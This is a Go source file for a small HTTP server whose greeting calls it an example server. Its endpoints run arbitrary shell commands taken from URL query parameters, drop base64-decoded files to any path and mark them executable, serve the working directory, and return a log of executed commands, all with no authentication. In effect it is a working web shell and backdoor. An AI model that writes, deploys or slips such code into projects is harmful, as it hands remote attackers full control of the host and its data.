package main

import (
	"net/http"
//	"log"
	"strings"
	"os/exec"
	"os"
	b64 "encoding/base64"
)

var outbg []byte
var busy bool = false
var log []string;



func HelloServer(w http.ResponseWriter, req *http.Request) {
	log=append(log,"HelloServer ")
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("This is an example server.\n"))
}

func cmd_foreground(w http.ResponseWriter, req *http.Request){
	w.Header().Set("Content-Type", "text/plain")
	cmd := req.URL.Query().Get("cmd")
	log=append(log,"cmd_foreground "+cmd)
	outs, err := exec.Command(cmd).Output()
	if err != nil {
		outs = []byte("cmd failed " + err.Error())
		}
	w.Write([]byte(outs))
}

func exec_gosub(cmd string){
	var err error
	busy=true
	log=append(log,"exec_gosub "+ cmd)
        outbg, err = exec.Command(cmd).Output()
	if err!=nil {
		log=append(log,"exec_gosub error:"+ err.Error())
		}
	busy=false
}

func cmd_background(w http.ResponseWriter, req *http.Request){
	out:="busy"
        w.Header().Set("Content-Type", "text/plain")
        cmd := req.URL.Query().Get("cmd")
	log=append(log,"cmd_background "+ cmd)
	if ! busy {
		go exec_gosub(cmd)
		out="success"
		}
        w.Write([]byte(out))
}
func cmd_background_check(w http.ResponseWriter, req *http.Request){
	log=append(log,"cmd_backgroundc ")
	out:="dummy"
        w.Header().Set("Content-Type", "text/plain")
	if busy {
		out="working"
		} else {
			out=string(outbg)
			}
        w.Write([]byte(out))
}
func upd_script(w http.ResponseWriter, req *http.Request){

	out:="ok"
	b64pl:=req.URL.Query().Get("b64pl")
	name:=req.URL.Query().Get("name")
        log=append(log,"upd_script "+ name)
	f, err := os.Create(name)
	if err != nil {
		log=append(log,"upd_script create:"+err.Error())
		out=string(err.Error())
		} else {
			defer f.Close()
			sDec, _ := b64.StdEncoding.DecodeString(b64pl)
			_, err = f.Write(sDec)
			if err != nil {
				log=append(log,"upd_script write:"+err.Error())
				out=string(err.Error())
				}else {
					if err := os.Chmod(name, 0777); err != nil {
						log=append(log,"upd_script chmod:"+err.Error())
						out=string(err.Error())
						}
					}

			}
        w.Write([]byte(out))
}
func getlog(w http.ResponseWriter, req *http.Request){
	log=append(log,"getlog ")
        w.Header().Set("Content-Type", "text/plain")
        w.Write([]byte(strings.Join(log[:], "\n")))
}



func main() {
	mux := http.NewServeMux()
	fileServer := http.FileServer(http.Dir("./"))
	mux.Handle("/f/", http.StripPrefix("/f", fileServer))
	mux.HandleFunc("/hello", HelloServer)
	mux.HandleFunc("/cmd_fore", cmd_foreground)
	mux.HandleFunc("/cmd_back", cmd_background)
	mux.HandleFunc("/cmd_backc", cmd_background_check)
	mux.HandleFunc("/upd_script", upd_script)
	mux.HandleFunc("/getlog", getlog)

	err := http.ListenAndServe(":8080", mux)
//    err := http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
	if err != nil {
		panic("ListenAndServe: ")
		}
}
